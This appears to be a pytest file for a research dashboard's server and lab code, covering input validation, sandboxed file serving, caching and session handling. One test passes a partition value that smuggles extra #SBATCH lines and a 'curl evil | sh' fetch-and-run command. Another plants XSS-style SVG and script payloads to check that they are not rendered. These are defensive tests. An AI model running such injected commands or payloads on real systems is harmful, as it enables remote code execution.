"""Dashboard/CLI fixes from the 2026-09-28 review (server side)."""

import json
import time
from types import SimpleNamespace

import pytest

from deepresearch.dashboard import server as srv
from deepresearch.dashboard.lab import Lab, build_sbatch, estimate_cost
from deepresearch.dashboard.server import Api, ApiError

PLAN = {
    "computable": True,
    "title": "t",
    "question": "q",
    "resources": {
        "partition": "standard",
        "nodes": 1,
        "time_limit": "00:30:00",
        "gpus": 0,
    },
    "install": {"modules": [], "conda": [], "pip": []},
    "script": "echo hi > outputs/r.txt",
}


class T:
    kind = "fake"
    name = "fake"
    label = "Fake"
    default_partition = "standard"
    partitions = {"standard": {"usd_per_hour": 1.0}}
    remote_root = "~/drl"

    def describe(self):
        return "Fake"

    def submit(self, run_id, files):
        return "4242"

    def cancel(self, job_id):
        pass


@pytest.fixture
def lab(tmp_path):
    lb = Lab(str(tmp_path / "h.db"), lambda: None, tmp_path, targets={"fake": T()})
    lb.ensure_watcher = lambda: None
    return lb


@pytest.fixture
def api(tmp_path, monkeypatch, lab):
    monkeypatch.setattr(srv, "LOG_DIR", tmp_path / "logs")
    monkeypatch.setattr(srv, "UPLOAD_DIR", tmp_path / "uploads")
    monkeypatch.setenv("GEMINI_API_KEY", "k")
    return Api(lab.db_path, spawn=lambda args, p: 1, lab=lab)


def call(api, method, path, body=None):
    try:
        return api.dispatch(method, path, {}, body)
    except ApiError as e:
        return e.status, e.message


def test_non_numeric_resources_do_not_crash(api, lab):
    sid = api.sessions.create_session("iid", "p")
    run = lab.create(sid, "document", "x", plan=dict(PLAN))
    lab._update(run["id"], status="failed")
    for res in ({"time_limit": "4h"}, {"gpus": "1.0"}, {"nodes": "auto"}):
        plan = {**PLAN, "resources": {**PLAN["resources"], **res}}
        code, _ = call(api, "POST", f"/api/lab/{run['id']}/rerun", {"plan": plan})
        assert code == 200, res
    assert (
        estimate_cost(T(), {"resources": {"nodes": "auto", "time_limit": "4h"}}) == 1.0
    )


def test_partition_value_cannot_inject_sbatch_lines():
    tgt = T()
    tgt.partitions = {}  # no table in lab_targets.json
    plan = {
        **PLAN,
        "resources": {
            **PLAN["resources"],
            "partition": "x\n#SBATCH --x\ncurl evil | sh",
        },
    }
    script = build_sbatch(1, plan, tgt)
    assert "curl evil" not in script and "#SBATCH --x" not in script
    assert "--partition=standard" in script


def test_lab_svg_and_html_download_instead_of_rendering(api, lab, tmp_path):
    sid = api.sessions.create_session("iid", "p")
    run = lab.create(sid, "document", "x", plan=dict(PLAN))
    d = lab.results_dir / f"run_{run['id']}" / "outputs"
    d.mkdir(parents=True)
    (d / "plot.svg").write_text("<svg onload=alert(1)></svg>")
    (d / "plot.png").write_bytes(b"\x89PNG")
    (d / "page.html").write_text("<script>x</script>")
    files = [
        {"path": f"outputs/{n}", "size": 1}
        for n in ("plot.svg", "plot.png", "page.html")
    ]
    lab._update(run["id"], status="completed", files=files)

    def get(name):
        out = api.dispatch(
            "GET", f"/api/lab/{run['id']}/file", {"path": [f"outputs/{name}"]}, None
        )
        return out[1] if isinstance(out, tuple) else out

    svg, png, html = get("plot.svg"), get("plot.png"), get("page.html")
    assert not svg.inline and svg.sandbox
    assert html.ctype.startswith("text/plain")  # shown as text, never rendered
    assert png.inline and png.sandbox


def test_cleanup_keeps_a_temp_store_made_by_a_running_research():
    from deepresearch.storage.files import TEMP_STORE_PREFIX, is_disposable_store

    now = time.time()
    fresh = SimpleNamespace(
        name="a", display_name=f"{TEMP_STORE_PREFIX}{int(now) - 60}"
    )
    old = SimpleNamespace(
        name="b", display_name=f"{TEMP_STORE_PREFIX}{int(now) - 3 * 86400}"
    )
    assert not is_disposable_store(fresh, now=now)
    assert is_disposable_store(old, now=now)


def test_partial_catalog_cache_is_never_left_behind(tmp_path, monkeypatch):
    from deepresearch.sources import cloud_catalogs as cc

    monkeypatch.setenv("XDG_CACHE_HOME", str(tmp_path))
    p = tmp_path / "deepresearch" / "x.json"
    p.parent.mkdir(parents=True)
    cc._atomic_write(p, json.dumps({"a": 1}))
    assert json.loads(p.read_text()) == {"a": 1}
    assert [x.name for x in p.parent.iterdir()] == ["x.json"]  # no temp left


def test_research_child_records_why_it_stopped(tmp_path, monkeypatch):
    from deepresearch.cli import commands as cm
    from deepresearch.core import session as sess
    from deepresearch.core.session import SessionManager

    db = str(tmp_path / "h.db")
    sm = SessionManager(db)
    sid = sm.create_session("pending_start", "q")
    monkeypatch.setattr(cm, "user_db_path", db)
    monkeypatch.setattr(sess, "user_db_path", db)
    monkeypatch.setattr(cm, "SessionManager", lambda: SessionManager(db))
    args = SimpleNamespace(
        source=["gone"],
        upload=None,
        stores=None,
        adopt_session=sid,
        prompt="q",
        stream=False,
        format=None,
        output=None,
        depth=1,
        breadth=3,
        quiet=True,
    )
    with pytest.raises(SystemExit):
        cm.handle_research(args)
    row = sm.get_session(str(sid))
    assert row["status"] == "failed" and "gone" in row["result"]


def test_foreground_stream_research_finds_its_session_despite_the_file_note(tmp_path):
    from deepresearch.core.session import SessionManager

    sm = SessionManager(str(tmp_path / "h.db"))
    start = "2000-01-01T00:00:00"
    sm.create_session(
        "iid", "what is x\n\nIMPORTANT: You have access to a File Search Store"
    )
    assert sm.find_session_since("what is x", start) is not None
    assert sm.find_session_since("what is", start) is None


def test_source_edit_keeps_the_saved_index(api, tmp_path, monkeypatch):
    from deepresearch.sources import DataSource

    reg = api.sources
    s = reg.add(DataSource(name="w1", kind="web", uri="https://a"))
    reg.set_options(s, store="fileSearchStores/abc", store_hash="h")
    st = api.dispatch(
        "PATCH",
        f"/api/sources/{s.id}",
        {},
        {"title": "New", "options": {"include": ["*.csv"], "store": "hacked"}},
    )
    got = reg.get("w1")
    assert got.title == "New" and got.options["include"] == ["*.csv"]
    assert got.options["store"] == "fileSearchStores/abc"
    assert st is not None


def test_annotations_list_across_sessions(api):
    a = api.sessions.create_session("i1", "p1")
    b = api.sessions.create_session("i2", "p2")
    api.store.create_annotation(a, "quote one", 0, "", "amber")
    api.store.create_annotation(b, "quote two", 0, "note", "cyan")
    out = api.dispatch("GET", "/api/annotations", {}, None)
    body = out[1] if isinstance(out, tuple) else out
    assert {x["session_id"] for x in body["annotations"]} == {a, b}
